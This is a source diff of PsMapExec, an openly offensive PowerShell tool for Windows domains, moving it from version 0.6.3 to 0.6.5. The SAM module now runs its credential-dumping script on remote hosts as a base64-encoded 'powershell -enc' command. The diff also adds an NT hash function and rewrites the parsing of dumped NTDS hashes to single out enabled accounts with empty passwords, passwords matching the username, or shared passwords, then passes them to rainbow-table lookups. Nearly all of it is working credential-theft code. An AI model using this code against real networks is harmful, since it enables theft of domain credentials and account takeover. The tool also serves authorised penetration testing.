@@ -259,7 +259,7 @@ Documentation: https://viperone.gitbook.io/pentest-everything/psmapexec
                                                                  
 
 Github  : https://github.com/The-Viper-One
-Version : 0.6.3")
+Version : 0.6.5")
 
     if (!$NoBanner) {
         Write-Output $Banner
@@ -2207,12 +2207,11 @@ This flush operation clears the stored LDAP queries to prevent the reuse of resu
     }
 
     # SAM
-    elseif ($Module -eq "sam") {
+    elseif ($Module -eq "SAM") {
         
-        $key = Generate-RandomString 32
-        $iv = Generate-RandomString 16  
-        $n = AESEnc -k $key -iv $iv -t "$LocalSAM"
-        $Command = "try {$Arbiter} Catch{}  ; $Decrypt ;  AESDec $key $iv $n | IEX"
+        $b64 = "$LocalSAM"
+        $base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
+        $Command = "powershell.exe -enc $base64command"
     }
 
     # WinSCP
@@ -6166,6 +6165,148 @@ public class Advapi32 {
     }
 
     ################################################################################################################
+    ################################################# Function: ConvertTo-NT #######################################
+    ################################################################################################################
+
+    function ConvertTo-NT {
+    [CmdletBinding()]
+    param(
+        [Parameter(Mandatory = $true,
+            ValueFromPipeline = $true)]
+        [ValidateNotNull()]
+        [String]
+        $String
+    )
+
+    begin {
+        $Decoder = [System.Text.Encoding]::Unicode
+    }
+
+    process {
+        $Array = $Decoder.GetBytes($String)
+
+        $M = [System.Collections.ArrayList]@()
+        for ($i = 0; $i -le ($Array.count - 1); $i++) {
+            $null = $M.Add($Array[$i])
+        }
+
+        $null = $M.Add(0x80)
+        while ($M.count % 64 -ne 56) { $null = $M.Add(0) }
+        for ($i = 1; $i -le 8; $i++) { $null = $M.Add([int]0) }
+
+        [Byte[]]$M = $M
+        @([BitConverter]::GetBytes($Array.Count * 8)).CopyTo($M, $M.Count - 8)
+
+        $A = [Convert]::ToUInt32('0x67452301', 16)
+        $B = [Convert]::ToUInt32('0xefcdab89', 16)
+        $C = [Convert]::ToUInt32('0x98badcfe', 16)
+        $D = [Convert]::ToUInt32('0x10325476', 16)
+
+        if (-not ([System.Management.Automation.PSTypeName]"Shift").Type) {
+            Add-Type -TypeDefinition @'
+    public class Shift
+    {
+        public static uint Left(uint a, int b)
+        {
+            return ((a << b) | (((a >> 1) & 0x7fffffff) >> (32 - b - 1)));
+        }
+    }
+'@ | Out-Null
+        }
+
+
+        function FF([uint32]$X, [uint32]$Y, [uint32]$Z) {
+            (($X -band $Y) -bor ((-bnot $X) -band $Z))
+        }
+        function GG([uint32]$X, [uint32]$Y, [uint32]$Z) {
+            (($X -band $Y) -bor ($X -band $Z) -bor ($Y -band $Z))
+        }
+        function HH([uint32]$X, [uint32]$Y, [uint32]$Z) {
+            ($X -bxor $Y -bxor $Z)
+        }
+
+        for ($i = 0; $i -lt $M.Count; $i += 64) {
+            $AA = $A
+            $BB = $B
+            $CC = $C
+            $DD = $D
+
+            $A = [Shift]::Left(($A + (FF -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 0)..($i + 3)], 0)) -band [uint32]::MaxValue, 3)
+            $D = [Shift]::Left(($D + (FF -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 4)..($i + 7)], 0)) -band [uint32]::MaxValue, 7)
+            $C = [Shift]::Left(($C + (FF -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 8)..($i + 11)], 0)) -band [uint32]::MaxValue, 11)
+            $B = [Shift]::Left(($B + (FF -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 12)..($i + 15)], 0)) -band [uint32]::MaxValue, 19)
+
+            $A = [Shift]::Left(($A + (FF -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 16)..($i + 19)], 0)) -band [uint32]::MaxValue, 3)
+            $D = [Shift]::Left(($D + (FF -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 20)..($i + 23)], 0)) -band [uint32]::MaxValue, 7)
+            $C = [Shift]::Left(($C + (FF -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 24)..($i + 27)], 0)) -band [uint32]::MaxValue, 11)
+            $B = [Shift]::Left(($B + (FF -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 28)..($i + 31)], 0)) -band [uint32]::MaxValue, 19)
+
+            $A = [Shift]::Left(($A + (FF -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 32)..($i + 35)], 0)) -band [uint32]::MaxValue, 3)
+            $D = [Shift]::Left(($D + (FF -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 36)..($i + 39)], 0)) -band [uint32]::MaxValue, 7)
+            $C = [Shift]::Left(($C + (FF -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 40)..($i + 43)], 0)) -band [uint32]::MaxValue, 11)
+            $B = [Shift]::Left(($B + (FF -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 44)..($i + 47)], 0)) -band [uint32]::MaxValue, 19)
+
+            $A = [Shift]::Left(($A + (FF -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 48)..($i + 51)], 0)) -band [uint32]::MaxValue, 3)
+            $D = [Shift]::Left(($D + (FF -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 52)..($i + 55)], 0)) -band [uint32]::MaxValue, 7)
+            $C = [Shift]::Left(($C + (FF -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 56)..($i + 59)], 0)) -band [uint32]::MaxValue, 11)
+            $B = [Shift]::Left(($B + (FF -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 60)..($i + 63)], 0)) -band [uint32]::MaxValue, 19)
+
+            $A = [Shift]::Left(($A + (GG -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 0)..($i + 3)], 0) + 0x5A827999) -band [uint32]::MaxValue, 3)
+            $D = [Shift]::Left(($D + (GG -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 16)..($i + 19)], 0) + 0x5A827999) -band [uint32]::MaxValue, 5)
+            $C = [Shift]::Left(($C + (GG -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 32)..($i + 35)], 0) + 0x5A827999) -band [uint32]::MaxValue, 9)
+            $B = [Shift]::Left(($B + (GG -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 48)..($i + 51)], 0) + 0x5A827999) -band [uint32]::MaxValue, 13)
+
+            $A = [Shift]::Left(($A + (GG -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 4)..($i + 7)], 0) + 0x5A827999) -band [uint32]::MaxValue, 3)
+            $D = [Shift]::Left(($D + (GG -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 20)..($i + 23)], 0) + 0x5A827999) -band [uint32]::MaxValue, 5)
+            $C = [Shift]::Left(($C + (GG -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 36)..($i + 39)], 0) + 0x5A827999) -band [uint32]::MaxValue, 9)
+            $B = [Shift]::Left(($B + (GG -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 52)..($i + 55)], 0) + 0x5A827999) -band [uint32]::MaxValue, 13)
+
+            $A = [Shift]::Left(($A + (GG -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 8)..($i + 11)], 0) + 0x5A827999) -band [uint32]::MaxValue, 3)
+            $D = [Shift]::Left(($D + (GG -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 24)..($i + 27)], 0) + 0x5A827999) -band [uint32]::MaxValue, 5)
+            $C = [Shift]::Left(($C + (GG -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 40)..($i + 43)], 0) + 0x5A827999) -band [uint32]::MaxValue, 9)
+            $B = [Shift]::Left(($B + (GG -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 56)..($i + 59)], 0) + 0x5A827999) -band [uint32]::MaxValue, 13)
+
+            $A = [Shift]::Left(($A + (GG -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 12)..($i + 15)], 0) + 0x5A827999) -band [uint32]::MaxValue, 3)
+            $D = [Shift]::Left(($D + (GG -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 28)..($i + 31)], 0) + 0x5A827999) -band [uint32]::MaxValue, 5)
+            $C = [Shift]::Left(($C + (GG -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 44)..($i + 47)], 0) + 0x5A827999) -band [uint32]::MaxValue, 9)
+            $B = [Shift]::Left(($B + (GG -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 60)..($i + 63)], 0) + 0x5A827999) -band [uint32]::MaxValue, 13)
+
+            $A = [Shift]::Left(($A + (HH -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 0)..($i + 3)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 3)
+            $D = [Shift]::Left(($D + (HH -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 32)..($i + 35)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 9)
+            $C = [Shift]::Left(($C + (HH -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 16)..($i + 19)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 11)
+            $B = [Shift]::Left(($B + (HH -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 48)..($i + 51)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 15)
+
+            $A = [Shift]::Left(($A + (HH -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 8)..($i + 11)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 3)
+            $D = [Shift]::Left(($D + (HH -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 40)..($i + 43)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 9)
+            $C = [Shift]::Left(($C + (HH -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 24)..($i + 27)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 11)
+            $B = [Shift]::Left(($B + (HH -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 56)..($i + 59)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 15)
+
+            $A = [Shift]::Left(($A + (HH -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 4)..($i + 7)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 3)
+            $D = [Shift]::Left(($D + (HH -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 36)..($i + 39)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 9)
+            $C = [Shift]::Left(($C + (HH -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 20)..($i + 23)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 11)
+            $B = [Shift]::Left(($B + (HH -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 52)..($i + 55)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 15)
+
+            $A = [Shift]::Left(($A + (HH -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 12)..($i + 15)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 3)
+            $D = [Shift]::Left(($D + (HH -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 44)..($i + 47)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 9)
+            $C = [Shift]::Left(($C + (HH -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 28)..($i + 31)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 11)
+            $B = [Shift]::Left(($B + (HH -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 60)..($i + 63)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 15)
+
+            $A = ($A + $AA) -band [uint32]::MaxValue
+            $B = ($B + $BB) -band [uint32]::MaxValue
+            $C = ($C + $CC) -band [uint32]::MaxValue
+            $D = ($D + $DD) -band [uint32]::MaxValue
+        }
+
+        $A = ('{0:x8}' -f $A) -ireplace '^(\w{2})(\w{2})(\w{2})(\w{2})$', '$4$3$2$1'
+        $B = ('{0:x8}' -f $B) -ireplace '^(\w{2})(\w{2})(\w{2})(\w{2})$', '$4$3$2$1'
+        $C = ('{0:x8}' -f $C) -ireplace '^(\w{2})(\w{2})(\w{2})(\w{2})$', '$4$3$2$1'
+        $D = ('{0:x8}' -f $D) -ireplace '^(\w{2})(\w{2})(\w{2})(\w{2})$', '$4$3$2$1'
+
+        "$A$B$C$D"
+    }
+}
+
+    ################################################################################################################
     ################################################## Function: Parse-SAM #########################################
     ################################################################################################################
     function Parse-SAM {
@@ -6720,7 +6861,7 @@ public class Advapi32 {
                         # Assign a random variable name to each ticket path to help produce tidy output to console for command generation
                         if ($notes -match "TGT") {
                             do {
-                                $randomVarName = -join ((65..90) + (97..122) | Get-Random -Count 8 | % { [char]$_ })
+                                $randomVarName = -join ((65..90) + (97..122) | Get-Random -Count 12 | % { [char]$_ })
                             } while (Get-Variable -Name $randomVarName -ErrorAction SilentlyContinue -Scope Global)
 
                             Set-Variable -Name $randomVarName -Value $filePath -Scope Global
@@ -6752,111 +6893,168 @@ public class Advapi32 {
     ############################################## Function: Parse-NTDS ############################################
     ################################################################################################################
 
-    Function Parse-NTDS {
-        param (
-            [string]$DirectoryPath
-        )
 
+function Invoke-NTDSParse {
+    param (
+        [string]$File,
+        [array]$EnabledDomainUsers
+    )
 
-        $AvailableMethods = "WMI", "WinRM", "SMB", "MSSQL", "SessionHunter"
+    $NTDSContent = Get-Content -Path $File
+
+    $userHashes = @()
+    $computerHashes = @()
+    $identicalPasswordGroups = @{}
+    $enabledIdenticalPasswordGroups = @{}  # New hashtable for enabled users
+    $enabledUserHashes = @()
+    $emptyPasswordUsers = @()
+    $enabledEmptyPasswordUsers = @()
+    $UsersWithAccountNameAsPassword = @()
+    $EnabledUsersWithAccountNameAsPassword = @()
+
+    foreach ($line in $NTDSContent) {
+        $parts = $line -split ':'
+        $user = $parts[0]
+        $hash = $parts[3]
+
+        if ($hash -eq '31d6cfe0d16ae931b73c59d7e0c089c0') {
+            $emptyPasswordUsers += $user
+            if ($EnabledDomainUsers -contains $user) {
+                $enabledEmptyPasswordUsers += $user
+            }
+        }
+
+        try {
+        $NTValue = ConvertTo-NT -String $user
+        if ($NTValue -eq $hash) {
+            $UsersWithAccountNameAsPassword += $user
+            if ($EnabledDomainUsers -contains $user) {
+                $EnabledUsersWithAccountNameAsPassword += $user
+                
+                }
+            }
+        } Catch {}
+
+        if ($user -like "*$*") {
+            $computerHashes += $line
+        }
+        else {
+            $userHashes += $line
+            if ($hash -ne $null) {
+                if (-not $identicalPasswordGroups.ContainsKey($hash)) {
+                    $identicalPasswordGroups[$hash] = @()
+                }
+                $identicalPasswordGroups[$hash] += $user
+
+                # Check if user is enabled and add to enabled identical password groups
+                if ($EnabledDomainUsers -contains $user) {
+                    if (-not $enabledIdenticalPasswordGroups.ContainsKey($hash)) {
+                        $enabledIdenticalPasswordGroups[$hash] = @()
+                    }
+                    $enabledIdenticalPasswordGroups[$hash] += $user
+                }
+            }
+
+            if ($EnabledDomainUsers -contains $user) {
+                $enabledUserHashes += $line
+            }
+        }
+    }
+
+    return @{
+        userHashes = $userHashes
+        enabledUserHashes = $enabledUserHashes
+        computerHashes = $computerHashes
+        emptyPasswordUsers = $emptyPasswordUsers
+        enabledEmptyPasswordUsers = $enabledEmptyPasswordUsers
+        identicalPasswordGroups = $identicalPasswordGroups
+        enabledIdenticalPasswordGroups = $enabledIdenticalPasswordGroups  # Return enabled identical password groups
+        UsersWithAccountNameAsPassword = $UsersWithAccountNameAsPassword
+        EnabledUsersWithAccountNameAsPassword = $EnabledUsersWithAccountNameAsPassword
+    }
+}
+
+function Parse-NTDS {
+
+        $AvailableMethods = "WMI", "WinRM", "SMB"
         if ($Method -notin $AvailableMethods) { return }
 
-        Write-Host "`n`nParsing Results" -ForegroundColor "Yellow"
-        Start-sleep -Seconds "2"
 
-        if ([string]::IsNullOrEmpty($DirectoryPath)) {
-            Write-Host "Directory path is not specified or is empty." -ForegroundColor Red
-            return
+    Write-Host "`nParsing Results" -ForegroundColor "Yellow"
+    Start-Sleep -Seconds 2
+    
+    $NTDSDirectory = $NTDS
+    $NTDS_Files = Get-ChildItem -Path $NTDSDirectory | Where-Object {$_.Name -Like "*.txt"} | Select-Object -ExpandProperty "FullName"
+
+    $searcher = New-Object DirectoryServices.DirectorySearcher
+    $searcher.Filter = "(&(objectCategory=user)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=2)(!userAccountControl:1.2.840.113556.1.4.803:=16))"
+    $searcher.PropertiesToLoad.AddRange(@("samAccountName"))
+    $users = $searcher.FindAll() | Where-Object { $_.Properties["samAccountName"] -ne $null }
+    $EnabledDomainUsers = $users | ForEach-Object { $_.Properties["samAccountName"][0] }
+
+    foreach ($NTDS_File in $NTDS_Files) {
+        [string]$Date = @()
+        $Date += (Get-date).TimeOfDay.Hours
+        $Date += (Get-date).TimeOfDay.Minutes
+        $Date += (Get-date).TimeOfDay.Seconds
+
+        $results = Invoke-NTDSParse -File $NTDS_File -EnabledDomainUsers $EnabledDomainUsers
+        $fileBaseName = [IO.Path]::GetFileNameWithoutExtension($NTDS_File)
+        $outputDirectory = Join-Path $NTDSDirectory "${fileBaseName}_Parsed_${Date}"
+        $UserData = Join-Path $outputDirectory "User Data"
+        $ComputerData = Join-Path $outputDirectory "Computer Data"
+        $FullDump = Join-Path $outputDirectory "Full NTDS Dump"
+
+        if (-not (Test-Path -Path $outputDirectory)) {
+            New-Item -Path $outputDirectory -ItemType Directory | Out-Null
         }
 
-        if (-not (Test-Path -Path $DirectoryPath)) {
-            Write-Host "Directory at path '$DirectoryPath' does not exist." -ForegroundColor Red
-            return
+        if (-not (Test-Path -Path $UserData)) {
+            New-Item -Path $UserData -ItemType Directory | Out-Null
         }
 
-        $currentTime = Get-Date -Format "yyyyMMddHHmmss"
-        Get-ChildItem -Path $DirectoryPath -Filter "*-NTDS.txt" -File | ForEach-Object {
-            $NTDSFile = $_.FullName
-            $computerName = [IO.Path]::GetFileNameWithoutExtension($_.Name) -replace "-NTDS", ""
-            $newDirectoryName = "${computerName}-${currentTime}"
-            $newDirectoryPath = Join-Path $DirectoryPath $newDirectoryName
+        if (-not (Test-Path -Path $ComputerData)) {
+            New-Item -Path $ComputerData -ItemType Directory | Out-Null
+        }
 
-            if (-not (Test-Path -Path $newDirectoryPath)) {
-                New-Item -Path $newDirectoryPath -ItemType "Directory" | Out-Null
+        if (-not (Test-Path -Path $FullDump)) {
+            New-Item -Path $FullDump -ItemType Directory | Out-Null
+        }
+
+        $results.userHashes | Set-Content -Path (Join-Path $UserData  "1.All-User-Hashes.txt")
+        $results.enabledUserHashes | Set-Content -Path (Join-Path $UserData  "1.Enabled-User-Hashes.txt")
+        $results.computerHashes | Set-Content -Path (Join-Path $ComputerData "Computer-Hashes.txt") 
+        $results.enabledEmptyPasswordUsers | Set-Content -Path (Join-Path $UserData "2.Enabled-Users-With-Empty-Passwords.txt")
+        $results.emptyPasswordUsers | Set-Content -Path (Join-Path $UserData "2.All-Users-With-Empty-Passwords.txt")
+        $results.UsersWithAccountNameAsPassword | Set-Content -Path (Join-Path $UserData "3.All-Users-With-Password-As-Account-Name.txt")
+        $results.EnabledUsersWithAccountNameAsPassword | Set-Content -Path (Join-Path $UserData "3.Enabled-Users-With-Password-As-Account-Name.txt")
+
+        # Output for grouped users with identical passwords who are enabled
+        $groupNumber = 1
+        $groupedUsersContent = foreach ($group in $results.enabledIdenticalPasswordGroups.GetEnumerator()) {
+            if ($group.Value.Count -gt 1) {
+                Write-Output ""
+                $groupContent = "[Group $groupNumber]`n{0}" -f ($group.Value -join "`n")
+                $groupNumber++
+                $groupContent
             }
-
-            $userHashes = @()
-            $computerHashes = @()
-            $identicalPasswordGroups = @{}
-            $emptyPasswordUsers = @()
-            $samHashes = @()
-
-            $prevLine = ""
-            Get-Content $NTDSFile | ForEach-Object {
-                $line = $_
-                $parts = $line -split ':'
-                $user = $parts[0]
-                $hash = $parts[3]
-
-                if ($hash -eq '31d6cfe0d16ae931b73c59d7e0c089c0') {
-                    $emptyPasswordUsers += $user
-                }
-
-                if ($user -like "*$*") {
-                    $computerHashes += $line
-                }
-                else {
-                    $userHashes += $line
-
-                    if ($hash -ne $null) {
-                        if (-not $identicalPasswordGroups.ContainsKey($hash)) {
-                            $identicalPasswordGroups[$hash] = @()
-                        }
-                        $identicalPasswordGroups[$hash] += $user
-                    }
-
-                    # Check if the previous line and the current line do not have two "::" in a row
-                    if (-not ($line -match ':::' -and $prevLine -match ':::')) {
-                        $samHashes += $line
-                    }
-                }
-
-                $prevLine = $line
-            }
-
-            $userHashes | Set-Content -Path (Join-Path $newDirectoryPath "UserHashes.txt")
-            $computerHashes | Set-Content -Path (Join-Path $newDirectoryPath "ComputerHashes.txt")
-            $emptyPasswordUsers | Set-Content -Path (Join-Path $newDirectoryPath "UsersWithEmptyPasswords.txt")
-
-            $groupNumber = 1
-            $groupedUsersContent = foreach ($group in $identicalPasswordGroups.GetEnumerator()) {
-                if ($group.Value.Count -gt 1) {
-                    $groupContent = "[Group $groupNumber]`n{0}" -f ($group.Value -join "`n")
-                    $groupNumber++
-                    $groupContent
-                    Write-Output ""
-                }
-            }
-
-            $groupedUsersContent | Set-Content -Path (Join-Path $newDirectoryPath "GroupedUsersWithIdenticalPasswords.txt")
-
-            $newFileName = ".$computerName-NTDS-Full.txt"
-            Move-Item -Path $NTDSFile -Destination (Join-Path $newDirectoryPath $newFileName) -Force
-
-            # Write SAM hashes to SAMHashes.txt
-            $samHashes | Set-Content -Path (Join-Path $newDirectoryPath "SAMHashes.txt")
         }
 
-        Write-Output ""
-        Write-host "[*] " -ForegroundColor "Yellow" -NoNewline
-        Write-host "Parsed NTDS files stored in $newDirectoryPath"
-
-        if ($Rainbow) {
-            RainbowCheck -Module "NTDS" -RCFilePath (Join-Path $newDirectoryPath "UserHashes.txt")
-
-        }
-
+        $groupedUsersContent | Set-Content -Path (Join-Path $UserData "4.Enabled-Users-With-Identical-Passwords.txt")
+        Move-Item $NTDS_File -Destination "$FullDump" -Force
     }
+
+            if ($Rainbow) {
+            RainbowCheck -Module "NTDS" -RCFilePath "$UserData\1.Enabled-User-Hashes.txt"
+        }
+
+    Write-Output ""
+    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
+    Write-Host "Parsed NTDS files stored in $NTDSDirectory"
+}
+
+
+
 
     ################################################################################################################
     ############################################## Function: Parse-SCCM ############################################
@@ -7011,7 +7209,7 @@ public class Advapi32 {
     if (!$NoParse) { if ($Module -eq "eKeys") { Parse-eKeys } }
     if (!$NoParse) { if ($Module -eq "LogonPasswords") { Parse-LogonPasswords } }
     if (!$NoParse) { if ($Module -eq "KerbDump") { Parse-KerbDump } }
-    if (!$NoParse) { if ($Module -eq "NTDS") { Parse-NTDS -DirectoryPath $NTDS } }
+    if (!$NoParse) { if ($Module -eq "NTDS") { Parse-NTDS} }
     if (!$NoParse) { if ($Module -eq "SCCM") { Parse-SCCM } }
 
     RestoreTicket
